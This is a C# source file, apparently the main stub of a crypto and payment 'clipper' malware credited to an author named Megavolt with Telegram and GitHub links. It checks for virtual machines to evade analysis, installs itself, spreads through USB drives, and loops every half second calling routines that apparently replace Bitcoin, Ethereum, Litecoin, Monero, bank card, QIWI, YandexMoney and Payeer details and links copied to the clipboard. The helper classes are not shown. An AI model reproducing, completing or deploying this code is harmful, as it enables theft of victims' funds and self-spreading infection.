/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using Changer;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace stubOnion
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            if (MutEx.GetMutex())
            {
                DotMemory.GetdotMemory();

                if (Config.antivm == "1")
                {
                    if (!AntiVM.GetVM())
                    {
                        Installer.GetInstall();
                       
                        new Thread(() => { GetUSB(); }).Start();

                        // Создаем цикл проверки, потоки не поддерживает Clipboard.*
                        while (true)
                        {
                            Bitcoin.GetBitcoinWhile();
                            Etherium.GetEtheriumWhile();
                            LiteCoin.GetLiteCoinWhile();
                            Monero.GetMoneroWhile();
                            VisaSber.GetVisaSber();
                            McSber.GetMcSberSber();
                            QIWI.GetQiwiNumber();
                            QIWI.GetQiwiCard();
                            YandexMoney.GetYmoney();
                            URLChanger.GetLinks();
                            Payeer.GetPayeer();
                            Thread.Sleep(500);
                        }
                    }
                    else
                    {
                        Environment.Exit(0);
                    }
                }
                else
                {
                    Installer.GetInstall();
                    new Thread(() => { GetUSB(); }).Start();
                    while (true)
                    {
                        Bitcoin.GetBitcoinWhile();
                        Etherium.GetEtheriumWhile();
                        Thread.Sleep(500);
                    }
                }

            }
            else
            {
                Environment.Exit(0);
            }
        }

        static void GetUSB()
        {
            if (Config.Infectionusb == "1")
               USBInstaller.GetUSB();
        }


    }
}
